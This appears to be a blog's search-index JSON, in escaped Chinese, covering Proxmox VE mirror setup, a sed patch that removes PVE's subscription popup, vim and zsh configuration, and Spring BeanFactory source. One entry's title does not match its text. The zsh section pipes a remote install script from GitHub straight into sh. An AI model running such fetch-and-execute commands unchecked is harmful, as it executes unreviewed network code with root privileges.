\u200b\u5b89\u88c5\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7f51\u5361\u200b\u7684\u200b\u578b\u53f7\u200b\u662f\u200b enp5s0\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\u73b0\u5728\u200b\u7f51\u5361\u200b\u53d8\u6210\u200b\u4e86\u200b enp8s0\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u7f16\u8f91\u200b\u7f51\u5361\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u6539\u200b\u56de\u200b enp8s0 \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\uff08\u200b\u4e0b\u9762\u200b\u547d\u4ee4\u200b\u662f\u200b\uff1a\u200b\u7f16\u8f91\u200b\u7f51\u5361\u200b\u914d\u7f6e\u6587\u4ef6\u200b \u200b\u5c06\u200b enp5s0 \u200b\u66ff\u6362\u6210\u200b enp8s0\uff09\uff1a</p> Bash<pre><code>sed -i 's/enp5s0/enp8s0/g'  /etc/network/interfaces\n</code></pre> <p>\u200b\u7f16\u8f91\u200b\u5b8c\u200b\u91cd\u542f\u200b\u5373\u53ef\u200b\u89e3\u51b3\u95ee\u9898\u200b\u3002</p>"},{"location":"2/3/","title":"Springboot\u200b\u542f\u52a8\u200b\u6d41\u7a0b\u200b\u6e90\u7801\u200b\u89e3\u6790\u200b\uff08\u200b\u5e26\u200b\u6d41\u7a0b\u56fe\u200b\uff09","text":""},{"location":"2/3/#springboot","title":"Springboot\u200b\u542f\u52a8\u200b\u6d41\u7a0b\u200b\u6e90\u7801\u200b\u89e3\u6790\u200b\uff08\u200b\u5e26\u200b\u6d41\u7a0b\u56fe\u200b\uff09","text":"<p>\u200b\u9996\u5148\u200b\u67e5\u770b\u200b <code>cat /etc/os-release</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u53d1\u73b0\u200b PVE \u200b\u662f\u200b\u57fa\u4e8e\u200b Debian 11 \u200b\u4ee3\u53f7\u200b\u4e3a\u200b\uff1abullseye \u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6362\u6e90\u200b\u7684\u200b\u601d\u8def\u200b\u5c31\u200b\u7b80\u5355\u200b\u4e86\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u4e00\u4e9b\u200b\u547d\u4ee4\u200b\u5c31\u884c\u200b\uff1a</p> Bash<pre><code># \u200b\u6ce8\u91ca\u200b\u4f01\u4e1a\u200b\u6e90\u200b\necho \"#deb https://enterprise.proxmox.com/debian/pve bullseye pve-enterprise\" &gt; /etc/apt/sources.list.d/pve-enterprise.list\n\n# PVE \u200b\u8f6f\u4ef6\u200b\u6e90\u200b\u66f4\u6362\u200b\nwget https://mirrors.ustc.edu.cn/proxmox/debian/proxmox-release-bullseye.gpg -O /etc/apt/trusted.gpg.d/proxmox-release-bullseye.gpg\n\necho \"deb https://mirrors.ustc.edu.cn/proxmox/debian/pve bullseye pve-no-subscription\" &gt; /etc/apt/sources.list.d/pve-no-subscription.list\n\necho \"deb https://mirrors.ustc.edu.cn/proxmox/debian/ceph-pacific bullseye main\" &gt; /etc/apt/sources.list.d/ceph.list\n\nsed -i.bak \"s#http://download.proxmox.com/debian#https://mirrors.ustc.edu.cn/proxmox/debian#g\" /usr/share/perl5/PVE/CLI/pveceph.pm\n\n# \u200b\u5907\u4efd\u200b Debian \u200b\u66f4\u65b0\u200b\u6e90\u200b\nmv /etc/apt/sources.list /etc/apt/sources.list.bak\n\n# Debian \u200b\u7cfb\u7edf\u200b\u6e90\u200b\u66f4\u6362\u200b\necho \"deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free\" &gt; /etc/apt/sources.list\necho \"deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free\" &gt;&gt; /etc/apt/sources.list\necho \"deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free\" &gt;&gt; /etc/apt/sources.list\necho \"deb https://mirrors.tuna.tsinghua.edu.cn/proxmox/debian bullseye pve-no-subscription\" &gt; /etc/apt/sources.list.d/pve-no-subscription.list\n\n# \u200b\u66f4\u65b0\u200b\u6d4b\u8bd5\u200b\u4e00\u4e0b\u200b\napt update\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u9664\u4e86\u200b\u7b2c\u4e00\u4e2a\u200b\u6211\u4eec\u200b\u5b89\u88c5\u200b\u7684\u200b \u200b\u7f51\u7edc\u200b\u7a7f\u900f\u200b - ZeroTier\uff0c \u200b\u5176\u4ed6\u200b\u6240\u4ee5\u200b\u5168\u90e8\u200b\u8d70\u200b\u56fd\u5185\u200b\u7684\u200b\u66f4\u65b0\u200b\u6e90\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u770b\u200b\u4e00\u4e0b\u200b\u6211\u4eec\u200b\u5b58\u50a8\u200b\u5e93\u200b\u7684\u200b\u8be6\u60c5\u200b\uff0c\u200b\u4e0b\u9762\u200b\u8fd9\u4e2a\u200b\u300c\u200b\u6ca1\u6709\u200b\u542f\u7528\u200bProxmox VE\u200b\u5b58\u50a8\u200b\u5e93\u200b\uff0c\u200b\u4f60\u200b\u6ca1\u6709\u200b\u5f97\u5230\u200b\u4efb\u4f55\u200b\u66f4\u65b0\u200b\uff01\u300d\u200b\u65e0\u6240\u8c13\u200b\uff0c\u200b\u6211\u4eec\u200b PVE \u200b\u5b89\u88c5\u200b\u597d\u200b\u4e86\u200b\u672c\u6765\u200b\u5c31\u662f\u200b\u4e0d\u200b\u968f\u4fbf\u200b\u5347\u7ea7\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e0d\u200b\u66f4\u65b0\u200b\u6b63\u5982\u200b\u6211\u610f\u200b\uff0c\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u6211\u4eec\u200b\u6b63\u5e38\u200b apt install \u200b\u5b89\u88c5\u200b\u8f6f\u4ef6\u200b\u5c31\u200b\u5b8c\u4e8b\u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"2/3/#_1","title":"\u5220\u9664\u200b\u8ba2\u9605\u200b\u5f39\u7a97","text":"<p>PVE \u200b\u7684\u200b\u514d\u8d39\u200b\u7528\u6237\u200b\u6bcf\u6b21\u200b\u767b\u5f55\u200b\u4f1a\u200b\u6709\u200b\u5f39\u7a97\u200b\u663e\u793a\u200b\uff1a</p> <p> </p> <p>\u200b\u5f39\u7a97\u200b\u4ee3\u7801\u200b\u4e3b\u8981\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\u91cc\u9762\u200b\uff1a</p> Bash<pre><code>vim /usr/share/javascript/proxmox-widget-toolkit/proxmoxlib.js\n</code></pre> <p>\u200b\u641c\u7d22\u200b\u5173\u952e\u8bcd\u200b\uff1a<code>Ext.Msg.show</code> \u200b\u53ef\u4ee5\u200b\u5b9a\u4f4d\u200b\u5230\u200b\u76f8\u5173\u200b\u5f39\u7a97\u200b\u4ee3\u7801\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u6839\u636e\u200b\u4e0a\u9762\u200b\u7684\u200b\u601d\u8def\u200b\uff0cPVE 7.X \u200b\u6700\u7ec8\u200b\u5220\u9664\u200b\u8ba2\u9605\u200b\u5f39\u7a97\u200b\u547d\u4ee4\u200b\u5982\u4e0b\u200b\uff1a</p> Bash<pre><code>sed -Ezi.bak \"s/(Ext.Msg.show\\(\\{\\s+title: gettext\\('No valid sub)/void\\(\\{ \\/\\/\\1/g\" /usr/share/javascript/proxmox-widget-toolkit/proxmoxlib.js\n</code></pre> <p>\u200b\u6539\u5b8c\u200b\u91cd\u542f\u200b\u4e0b\u200b pveproxy \u200b\u670d\u52a1\u200b\u751f\u6548\u200b\uff1a</p> Bash<pre><code>systemctl restart pveproxy.service\n</code></pre> <p>\u200b\u5982\u679c\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u751f\u6548\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6e05\u7a7a\u200b\u4e00\u4e0b\u200b\u6d4f\u89c8\u5668\u200b\u7684\u200b\u7f13\u5b58\u200b\u5373\u53ef\u200b\u3002\u200b\u5176\u5b9e\u200b\u8fd9\u4e2a\u200b\u64cd\u4f5c\u200b\u5c31\u7b97\u200b\u624b\u8d31\u200b\u6539\u9519\u200b\u4e86\u200b\u4e5f\u200b\u6ca1\u5173\u7cfb\u200b\uff0c\u200b\u4f1a\u200b\u5728\u200b\u540c\u7ea7\u200b\u76ee\u5f55\u200b\u4e0b\u200b\u5907\u4efd\u200b\u4e00\u4e2a\u200b  proxmoxlib.js.bak \u200b\u6587\u4ef6\u200b\uff0c\u200b\u8fd8\u539f\u200b\u56de\u53bb\u200b\u5c31\u884c\u4e86\u200b\u3002</p>"},{"location":"2/3/#_2","title":"\u56fd\u5149\u200b\u7684\u200b\u504f\u597d\u200b\u8bbe\u7f6e","text":"<p>\u200b\u7406\u8bba\u200b\u4e0a\u200b\u5bbf\u4e3b\u673a\u200b\u8d8a\u200b\u5c11\u200b\u64cd\u4f5c\u200b\u8d8a\u200b\u597d\u200b\uff0c\u200b\u9632\u6b62\u200b\u5bbf\u4e3b\u673a\u200b\u88ab\u200b\u6c61\u67d3\u200b\u6302\u200b\u4e86\u200b\uff0c\u200b\u90a3\u200b All in one \u200b\u76f4\u63a5\u200b\u539f\u5730\u200b Boom\uff0c\u200b\u4f46\u662f\u200b PVE \u200b\u81ea\u5e26\u200b\u7684\u200b shell \u200b\u64cd\u4f5c\u200b\u8d77\u6765\u200b\u6548\u7387\u200b\u786e\u5b9e\u200b\u4e0d\u9ad8\u200b\uff0c\u200b\u6240\u4ee5\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd8\u662f\u200b\u5fcd\u4e0d\u4f4f\u200b\u8981\u200b\u6298\u817e\u200b\u4e00\u4e0b\u200b\u7684\u200b\uff0c\u200b\u4e2a\u4eba\u200b\u89c9\u5f97\u200b\u8fd8\u200b\u884c\u200b\u6ca1\u6709\u200b\u600e\u4e48\u200b\u52a8\u200b\u5e95\u5c42\u200b\u64cd\u4f5c\u200b\u3002</p>"},{"location":"2/3/#vim","title":"Vim \u200b\u4f18\u5316","text":"Bash<pre><code># \u200b\u5b89\u88c5\u200b vim\napt install vim\n\n# \u200b\u65b0\u5efa\u200b\u4e00\u4e2a\u200b vim \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1a\nvim ~/.vimrc\n</code></pre> <p>\u200b\u5185\u5bb9\u200b\u5982\u4e0b\u200b\uff1a</p> Bash<pre><code>set nu                \" \u200b\u663e\u793a\u200b\u884c\u53f7\u200b\ncolorscheme desert    \" \u200b\u989c\u8272\u200b\u663e\u793a\u200b\u65b9\u6848\u200b\nsyntax on             \" \u200b\u6253\u5f00\u200b\u8bed\u6cd5\u200b\u9ad8\u4eae\u200b\n</code></pre> <p>\u200b\u91cd\u65b0\u200b\u8f7d\u5165\u200b\u7ec8\u7aef\u200b\u5373\u53ef\u200b\u751f\u6548\u200b Vim \u200b\u7684\u200b\u4e00\u4e9b\u200b\u914d\u7f6e\u200b\u914d\u8272\u200b</p>"},{"location":"2/3/#zsh-shell","title":"zsh shell \u200b\u65b9\u6848","text":"Bash<pre><code># \u200b\u5b89\u88c5\u200b\u4f9d\u8d56\u200b\napt install git\n\n# \u200b\u5b89\u88c5\u200bzsh\napt install zsh\n\n# \u200b\u66f4\u6539\u200b\u9ed8\u8ba4\u200bshell\u200b\u4e3a\u200bzsh\nchsh -s /bin/zsh\n\n# \u200b\u5b89\u88c5\u200boh-my-zsh\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"\n</code></pre> <ul> <li>\u200b\u547d\u4ee4\u200b\u8865\u5168\u200b\u63d2\u4ef6\u200b\uff1azsh-autosuggestions</li> </ul> <p>git clone \u200b\u4e0b\u8f7d\u200b\u63d2\u4ef6\u200b\u5230\u200b zsh \u200b\u7684\u200b\u63d2\u4ef6\u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff1a</p> <p>Bash<pre><code>git clone https://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions\n</code></pre> \u200b\u7136\u540e\u200b\u5728\u200b zshrc \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u4fee\u6539\u200b\u5982\u4e0b\u200b\u5185\u5bb9\u200b\uff1a INI<pre><code>plugins=(git zsh-autosuggestions)\n</code></pre></p> <p>\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b zsh \u200b\u5373\u53ef\u200b\u751f\u6548\u200b\u3002</p> <ul> <li>\u200b\u5feb\u6377\u200b\u76ee\u5f55\u200b\u8df3\u8f6c\u200b\u63d2\u4ef6\u200b\uff1aautojump</li> </ul> <p>\u200b\u4f7f\u7528\u200b APT \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5b89\u88c5\u200b autojump \u200b\u63d2\u4ef6\u200b\uff1a</p> Bash<pre><code>apt install autojump\n</code></pre> <p>\u200b\u7136\u540e\u200b\u5728\u200b zshrc \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u4fee\u6539\u200b\u5982\u4e0b\u200b\u5185\u5bb9\u200b\uff1a</p> INI<pre><code>plugins=(\u200b\u5176\u4ed6\u200b\u7684\u200b\u63d2\u4ef6\u200b autojump)\n</code></pre> <p>\u200b\u8f93\u5165\u200b <code>zsh</code> \u200b\u547d\u4ee4\u200b\u751f\u6548\u200b\u914d\u7f6e\u200b\u540e\u200b\u5373\u53ef\u200b\u6b63\u5e38\u200b\u4f7f\u7528\u200b <code>j</code> \u200b\u547d\u4ee4\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u7b80\u5355\u200b\u7684\u200b\u6f14\u793a\u200b\u6548\u679c\u200b\uff1a</p> Bash<pre><code># root @ pve in ~/test/23333 [18:45:14]\n$ pwd\n/root/test/23333\n\n# root @ pve in ~/test/23333 [18:45:16]\n$ cd ~\n\n\n# root @ pve in ~ [18:45:17] \u200b\u76f4\u63a5\u200b j 2 \u200b\u5c31\u200b\u8df3\u8f6c\u200b\u5230\u200b\u5386\u53f2\u200b\u76ee\u5f55\u200b\u4e86\u200b\n$ j 2\n/root/test/23333\n\n# root @ pve in ~/test/23333 [18:45:20]\n$ pwd\n/root/test/23333\n</code></pre> <ul> <li>\u200b\u547d\u4ee4\u200b\u8bed\u6cd5\u200b\u68c0\u6d4b\u200b\u63d2\u4ef6\u200b\uff1azsh-syntax-highlighting</li> </ul> <p>git clone \u200b\u4e0b\u8f7d\u200b\u63d2\u4ef6\u200b\u5230\u200b zsh \u200b\u7684\u200b\u63d2\u4ef6\u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff1a</p> Bash<pre><code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting\n</code></pre> <p>\u200b\u7136\u540e\u200b\u5728\u200b zshrc \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u4fee\u6539\u200b\u5982\u4e0b\u200b\u5185\u5bb9\u200b\uff1a</p> INI<pre><code>plugins=(\u200b\u5176\u4ed6\u200b\u7684\u200b\u63d2\u4ef6\u200b zsh-syntax-highlighting)\n</code></pre> <p>\u200b\u5176\u4ed6\u200b zsh \u200b\u7684\u200b\u4f18\u5316\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5173\u6389\u200b URL \u200b\u53cd\u200b\u659c\u6760\u200b\u8f6c\u4e49\u200b\u4ee5\u53ca\u200b\u7981\u7528\u200b zsh \u200b\u81ea\u52a8\u66f4\u65b0\u200b\uff1a</p> Bash<pre><code>echo \"DISABLE_MAGIC_FUNCTIONS=true\" &gt;&gt; ~/.zshrc\necho \"zstyle ':omz:update' mode disabled\" &gt;&gt; ~/.zshrc\n</code></pre>"},{"location":"2/4/","title":"Spring-IoC\u200b\u5bb9\u5668\u200b\u6e90\u7801\u200b\u5bfc\u8bfb","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#1","title":"1.\u200b\u51e0\u4e2a\u200b\u91cd\u8981\u200b\u7c7b\u200b/\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_1","title":"\u9605\u8bfb\u200b\u524d\u200b\u7684\u200b\u51c6\u5907","text":"<ul> <li>\u200b\u6e90\u7801\u200b\u4e0b\u8f7d\u200b\uff1a<ul> <li>https://github.com/spring-projects/spring-framework  </li> <li>https://github.com/spring-projects/spring-framework.git</li> </ul> </li> <li>\u200b\u6e90\u7801\u200b\u7248\u672c\u200b\uff1av5.2.1.RELEASE</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#11-beanfactory-ioc","title":"1.1 BeanFactory \u200b\u9876\u7ea7\u200b\u63a5\u53e3\u200b\uff08\u200b\u4f4e\u914d\u200b\u7248\u200b\u7684\u200bIoC\u200b\u5bb9\u5668\u200b\uff09","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#beanfactory","title":"BeanFactory\u200b\u63a5\u53e3\u5b9a\u4e49\u200b\u8bf4\u660e","text":"<ul> <li>BeanFactory\u200b\u662f\u200b\u4f4e\u200b\u914d\u7248\u200b\u7684\u200bIoC\u200b\u5bb9\u5668\u200b\uff0c\u200b\u5b9a\u4e49\u200b\u4e86\u200bIoc\u200b\u5bb9\u5668\u200b\u57fa\u672c\u200b\u7684\u200b\u529f\u80fd\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_2","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2019 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.beans.factory;\n\nimport org.springframework.beans.BeansException;\nimport org.springframework.core.ResolvableType;\nimport org.springframework.lang.Nullable;\n\n/**\n * The root interface for accessing a Spring bean container.\n * This is the basic client view of a bean container;\n * further interfaces such as {@link ListableBeanFactory} and\n * {@link org.springframework.beans.factory.config.ConfigurableBeanFactory}\n * are available for specific purposes.\n *\n * &lt;p&gt;This interface is implemented by objects that hold a number of bean definitions,\n * each uniquely identified by a String name. Depending on the bean definition,\n * the factory will return either an independent instance of a contained object\n * (the Prototype design pattern), or a single shared instance (a superior\n * alternative to the Singleton design pattern, in which the instance is a\n * singleton in the scope of the factory). Which type of instance will be returned\n * depends on the bean factory configuration: the API is the same. Since Spring\n * 2.0, further scopes are available depending on the concrete application\n * context (e.g. \"request\" and \"session\" scopes in a web environment).\n *\n * &lt;p&gt;The point of this approach is that the BeanFactory is a central registry\n * of application components, and centralizes configuration of application\n * components (no more do individual objects need to read properties files,\n * for example). See chapters 4 and 11 of \"Expert One-on-One J2EE Design and\n * Development\" for a discussion of the benefits of this approach.\n *\n * &lt;p&gt;Note that it is generally better to rely on Dependency Injection\n * (\"push\" configuration) to configure application objects through setters\n * or constructors, rather than use any form of \"pull\" configuration like a\n * BeanFactory lookup. Spring's Dependency Injection functionality is\n * implemented using this BeanFactory interface and its subinterfaces.\n *\n * &lt;p&gt;Normally a BeanFactory will load bean definitions stored in a configuration\n * source (such as an XML document), and use the {@code org.springframework.beans}\n * package to configure the beans. However, an implementation could simply return\n * Java objects it creates as necessary directly in Java code. There are no\n * constraints on how the definitions could be stored: LDAP, RDBMS, XML,\n * properties file, etc. Implementations are encouraged to support references\n * amongst beans (Dependency Injection).\n *\n * &lt;p&gt;In contrast to the methods in {@link ListableBeanFactory}, all of the\n * operations in this interface will also check parent factories if this is a\n * {@link HierarchicalBeanFactory}. If a bean is not found in this factory instance,\n * the immediate parent factory will be asked. Beans in this factory instance\n * are supposed to override beans of the same name in any parent factory.\n *\n * &lt;p&gt;Bean factory implementations should support the standard bean lifecycle interfaces\n * as far as possible. The full set of initialization methods and their standard order is:\n * &lt;ol&gt;\n * &lt;li&gt;BeanNameAware's {@code setBeanName}\n * &lt;li&gt;BeanClassLoaderAware's {@code setBeanClassLoader}\n * &lt;li&gt;BeanFactoryAware's {@code setBeanFactory}\n * &lt;li&gt;EnvironmentAware's {@code setEnvironment}\n * &lt;li&gt;EmbeddedValueResolverAware's {@code setEmbeddedValueResolver}\n * &lt;li&gt;ResourceLoaderAware's {@code setResourceLoader}\n * (only applicable when running in an application context)\n * &lt;li&gt;ApplicationEventPublisherAware's {@code setApplicationEventPublisher}\n * (only applicable when running in an application context)\n * &lt;li&gt;MessageSourceAware's {@code setMessageSource}\n * (only applicable when running in an application context)\n * &lt;li&gt;ApplicationContextAware's {@code setApplicationContext}\n * (only applicable when running in an application context)\n * &lt;li&gt;ServletContextAware's {@code setServletContext}\n * (only applicable when running in a web application context)\n * &lt;li&gt;{@code postProcessBeforeInitialization} methods of BeanPostProcessors\n * &lt;li&gt;InitializingBean's {@code afterPropertiesSet}\n * &lt;li&gt;a custom init-method definition\n * &lt;li&gt;{@code postProcessAfterInitialization} methods of BeanPostProcessors\n * &lt;/ol&gt;\n *\n * &lt;p&gt;On shutdown of a bean factory, the following lifecycle methods apply:\n * &lt;ol&gt;\n * &lt;li&gt;{@code postProcessBeforeDestruction} methods of DestructionAwareBeanPostProcessors\n * &lt;li&gt;DisposableBean's {@code destroy}\n * &lt;li&gt;a custom destroy-method definition\n * &lt;/ol&gt;\n *\n * @author Rod Johnson\n * @author Juergen Hoeller\n * @author Chris Beams\n * @since 13 April 2001\n * @see BeanNameAware#setBeanName\n * @see BeanClassLoaderAware#setBeanClassLoader\n * @see BeanFactoryAware#setBeanFactory\n * @see org.springframework.context.ResourceLoaderAware#setResourceLoader\n * @see org.springframework.context.ApplicationEventPublisherAware#setApplicationEventPublisher\n * @see org.springframework.context.MessageSourceAware#setMessageSource\n * @see org.springframework.context.ApplicationContextAware#setApplicationContext\n * @see org.springframework.web.context.ServletContextAware#setServletContext\n * @see org.springframework.beans.factory.config.BeanPostProcessor#postProcessBeforeInitialization\n * @see InitializingBean#afterPropertiesSet\n * @see org.springframework.beans.factory.support.RootBeanDefinition#getInitMethodName\n * @see org.springframework.beans.factory.config.BeanPostProcessor#postProcessAfterInitialization\n * @see DisposableBean#destroy\n * @see org.springframework.beans.factory.support.RootBeanDefinition#getDestroyMethodName\n */\npublic interface BeanFactory {\n\n    /**\n     * Used to dereference a {@link FactoryBean} instance and distinguish it from\n     * beans &lt;i&gt;created&lt;/i&gt; by the FactoryBean. For example, if the bean named\n     * {@code myJndiObject} is a FactoryBean, getting {@code &amp;myJndiObject}\n     * will return the factory, not the instance returned by the factory.\n     */\n    String FACTORY_BEAN_PREFIX = \"&amp;\";\n\n\n    /**\n     * Return an instance, which may be shared or independent, of the specified bean.\n     * &lt;p&gt;This method allows a Spring BeanFactory to be used as a replacement for the\n     * Singleton or Prototype design pattern. Callers may retain references to\n     * returned objects in the case of Singleton beans.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to retrieve\n     * @return an instance of the bean\n     * @throws NoSuchBeanDefinitionException if there is no bean with the specified name\n     * @throws BeansException if the bean could not be obtained\n     */\n    Object getBean(String name) throws BeansException;\n\n    /**\n     * Return an instance, which may be shared or independent, of the specified bean.\n     * &lt;p&gt;Behaves the same as {@link #getBean(String)}, but provides a measure of type\n     * safety by throwing a BeanNotOfRequiredTypeException if the bean is not of the\n     * required type. This means that ClassCastException can't be thrown on casting\n     * the result correctly, as can happen with {@link #getBean(String)}.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to retrieve\n     * @param requiredType type the bean must match; can be an interface or superclass\n     * @return an instance of the bean\n     * @throws NoSuchBeanDefinitionException if there is no such bean definition\n     * @throws BeanNotOfRequiredTypeException if the bean is not of the required type\n     * @throws BeansException if the bean could not be created\n     */\n    &lt;T&gt; T getBean(String name, Class&lt;T&gt; requiredType) throws BeansException;\n\n    /**\n     * Return an instance, which may be shared or independent, of the specified bean.\n     * &lt;p&gt;Allows for specifying explicit constructor arguments / factory method arguments,\n     * overriding the specified default arguments (if any) in the bean definition.\n     * @param name the name of the bean to retrieve\n     * @param args arguments to use when creating a bean instance using explicit arguments\n     * (only applied when creating a new instance as opposed to retrieving an existing one)\n     * @return an instance of the bean\n     * @throws NoSuchBeanDefinitionException if there is no such bean definition\n     * @throws BeanDefinitionStoreException if arguments have been given but\n     * the affected bean isn't a prototype\n     * @throws BeansException if the bean could not be created\n     * @since 2.5\n     */\n    Object getBean(String name, Object... args) throws BeansException;\n\n    /**\n     * Return the bean instance that uniquely matches the given object type, if any.\n     * &lt;p&gt;This method goes into {@link ListableBeanFactory} by-type lookup territory\n     * but may also be translated into a conventional by-name lookup based on the name\n     * of the given type. For more extensive retrieval operations across sets of beans,\n     * use {@link ListableBeanFactory} and/or {@link BeanFactoryUtils}.\n     * @param requiredType type the bean must match; can be an interface or superclass\n     * @return an instance of the single bean matching the required type\n     * @throws NoSuchBeanDefinitionException if no bean of the given type was found\n     * @throws NoUniqueBeanDefinitionException if more than one bean of the given type was found\n     * @throws BeansException if the bean could not be created\n     * @since 3.0\n     * @see ListableBeanFactory\n     */\n    &lt;T&gt; T getBean(Class&lt;T&gt; requiredType) throws BeansException;\n\n    /**\n     * Return an instance, which may be shared or independent, of the specified bean.\n     * &lt;p&gt;Allows for specifying explicit constructor arguments / factory method arguments,\n     * overriding the specified default arguments (if any) in the bean definition.\n     * &lt;p&gt;This method goes into {@link ListableBeanFactory} by-type lookup territory\n     * but may also be translated into a conventional by-name lookup based on the name\n     * of the given type. For more extensive retrieval operations across sets of beans,\n     * use {@link ListableBeanFactory} and/or {@link BeanFactoryUtils}.\n     * @param requiredType type the bean must match; can be an interface or superclass\n     * @param args arguments to use when creating a bean instance using explicit arguments\n     * (only applied when creating a new instance as opposed to retrieving an existing one)\n     * @return an instance of the bean\n     * @throws NoSuchBeanDefinitionException if there is no such bean definition\n     * @throws BeanDefinitionStoreException if arguments have been given but\n     * the affected bean isn't a prototype\n     * @throws BeansException if the bean could not be created\n     * @since 4.1\n     */\n    &lt;T&gt; T getBean(Class&lt;T&gt; requiredType, Object... args) throws BeansException;\n\n    /**\n     * Return a provider for the specified bean, allowing for lazy on-demand retrieval\n     * of instances, including availability and uniqueness options.\n     * @param requiredType type the bean must match; can be an interface or superclass\n     * @return a corresponding provider handle\n     * @since 5.1\n     * @see #getBeanProvider(ResolvableType)\n     */\n    &lt;T&gt; ObjectProvider&lt;T&gt; getBeanProvider(Class&lt;T&gt; requiredType);\n\n    /**\n     * Return a provider for the specified bean, allowing for lazy on-demand retrieval\n     * of instances, including availability and uniqueness options.\n     * @param requiredType type the bean must match; can be a generic type declaration.\n     * Note that collection types are not supported here, in contrast to reflective\n     * injection points. For programmatically retrieving a list of beans matching a\n     * specific type, specify the actual bean type as an argument here and subsequently\n     * use {@link ObjectProvider#orderedStream()} or its lazy streaming/iteration options.\n     * @return a corresponding provider handle\n     * @since 5.1\n     * @see ObjectProvider#iterator()\n     * @see ObjectProvider#stream()\n     * @see ObjectProvider#orderedStream()\n     */\n    &lt;T&gt; ObjectProvider&lt;T&gt; getBeanProvider(ResolvableType requiredType);\n\n    /**\n     * Does this bean factory contain a bean definition or externally registered singleton\n     * instance with the given name?\n     * &lt;p&gt;If the given name is an alias, it will be translated back to the corresponding\n     * canonical bean name.\n     * &lt;p&gt;If this factory is hierarchical, will ask any parent factory if the bean cannot\n     * be found in this factory instance.\n     * &lt;p&gt;If a bean definition or singleton instance matching the given name is found,\n     * this method will return {@code true} whether the named bean definition is concrete\n     * or abstract, lazy or eager, in scope or not. Therefore, note that a {@code true}\n     * return value from this method does not necessarily indicate that {@link #getBean}\n     * will be able to obtain an instance for the same name.\n     * @param name the name of the bean to query\n     * @return whether a bean with the given name is present\n     */\n    boolean containsBean(String name);\n\n    /**\n     * Is this bean a shared singleton? That is, will {@link #getBean} always\n     * return the same instance?\n     * &lt;p&gt;Note: This method returning {@code false} does not clearly indicate\n     * independent instances. It indicates non-singleton instances, which may correspond\n     * to a scoped bean as well. Use the {@link #isPrototype} operation to explicitly\n     * check for independent instances.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @return whether this bean corresponds to a singleton instance\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @see #getBean\n     * @see #isPrototype\n     */\n    boolean isSingleton(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Is this bean a prototype? That is, will {@link #getBean} always return\n     * independent instances?\n     * &lt;p&gt;Note: This method returning {@code false} does not clearly indicate\n     * a singleton object. It indicates non-independent instances, which may correspond\n     * to a scoped bean as well. Use the {@link #isSingleton} operation to explicitly\n     * check for a shared singleton instance.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * 